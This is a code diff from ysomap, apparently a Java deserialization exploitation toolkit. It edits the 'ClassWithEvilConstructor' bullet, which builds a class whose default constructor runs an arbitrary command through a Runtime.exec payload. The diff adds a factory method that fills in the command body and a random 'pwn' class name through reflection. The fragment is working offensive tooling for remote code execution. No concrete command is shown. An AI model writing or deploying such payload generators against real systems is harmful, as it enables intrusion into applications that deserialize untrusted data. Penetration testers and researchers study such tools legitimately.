@@ -4,6 +4,9 @@ import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
 import ysomap.core.util.PayloadHelper;
+import ysomap.core.util.ReflectionHelper;
+
+import java.util.Random;
 
 /**
  * @author wh1t3P1g
@@ -37,5 +40,13 @@ public class ClassWithEvilConstructor implements Bullet<byte[]> {
             code = PayloadHelper.makeRuntimeExecPayload(body);
         }
         return ClassFiles.makeClassWithDefaultConstructor(classname, code);
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        ClassWithEvilConstructor bullet = new ClassWithEvilConstructor();
+        ReflectionHelper.set(bullet, "type", "class");
+        ReflectionHelper.set(bullet, "body", args[0]);
+        ReflectionHelper.set(bullet, "classname", "pwn"+new Random().nextLong());
+        return bullet;
     }
 }
